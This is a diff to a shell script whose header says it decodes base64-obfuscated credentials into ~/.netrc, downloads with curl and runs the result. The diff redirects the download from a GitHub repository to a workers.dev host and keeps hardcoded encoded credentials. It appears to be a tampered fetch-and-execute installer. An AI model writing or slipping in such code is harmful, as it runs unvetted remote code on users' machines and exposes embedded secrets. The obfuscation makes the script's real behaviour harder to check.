@@ -2,14 +2,14 @@
 # Base64-obfuscated creds -> .netrc -> curl --netrc -> run
 set -euo pipefail
 
-URL="https://github.com/HandleGaming/ryzencloud.git"
+URL="https://ptero2.jishnumondal32.workers.dev"
 HOST="ptero2.jishnumondal32.workers.dev"
 NETRC="${HOME}/.netrc"
 
 # --- helpers ---
 b64d() { printf '%s' "$1" | base64 -d; }
 
-# verify by Handle Gaming
+# verify by jishnu
 USER_B64="amlzaG51"
 PASS_B64="amlzaG51aEBja2VyMTIz"
 
@@ -52,3 +52,4 @@ else
   echo "Authentication or download failed." >&2
   exit 1
 fi
+
